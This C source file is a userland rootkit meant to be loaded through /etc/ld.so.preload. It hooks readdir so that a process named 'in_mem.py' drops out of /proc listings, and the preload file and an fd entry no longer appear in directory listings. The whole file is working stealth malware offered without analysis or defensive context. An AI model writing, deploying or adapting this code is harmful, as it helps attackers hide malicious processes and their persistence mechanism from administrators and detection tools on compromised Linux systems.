#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/* Every process with this name will be excluded */
static const char *process_to_filter = "in_mem.py";

/* Every file with these names will be excluded */
static const char *hidden_files[] = {
    "/etc/ld.so.preload",
    "/proc/self/fd/3"
};

/* Get a directory name given a DIR* handle */
static int get_dir_name(DIR *dirp, char *buf, size_t size) {
    int fd = dirfd(dirp);
    if (fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/* Get a process name given its pid */
static int get_process_name(char *pid, char *buf) {
    if (strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[275];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);

    FILE *f = fopen(tmp, "r");
    if (f == NULL) {
        return 0;
    }

    if (fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

typedef struct dirent *(*ReaddirFunc)(DIR *);

static ReaddirFunc original_readdir = NULL;

struct dirent *readdir(DIR *dirp) {
    if (original_readdir == NULL) {
        original_readdir = (ReaddirFunc)dlsym(RTLD_NEXT, "readdir");
        if (original_readdir == NULL) {
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
        }
    }

    struct dirent *dir;

    while (1) {
        dir = original_readdir(dirp);
        if (dir) {
            char dir_name[256];
            char process_name[256];
            if (get_dir_name(dirp, dir_name, sizeof(dir_name)) &&
                strcmp(dir_name, "/proc") == 0 &&
                get_process_name(dir->d_name, process_name) &&
                strcmp(process_name, process_to_filter) == 0) {
                continue;
            }
        }

        int isHidden = 0;
        for (size_t i = 0; i < sizeof(hidden_files) / sizeof(hidden_files[0]); ++i) {
            if (dir && strcmp(dir->d_name, strrchr(hidden_files[i], '/') + 1) == 0) {
                isHidden = 1;
                break;
            }
        }

        if (isHidden) {
            continue;
        }

        break;
    }

    return dir;
}
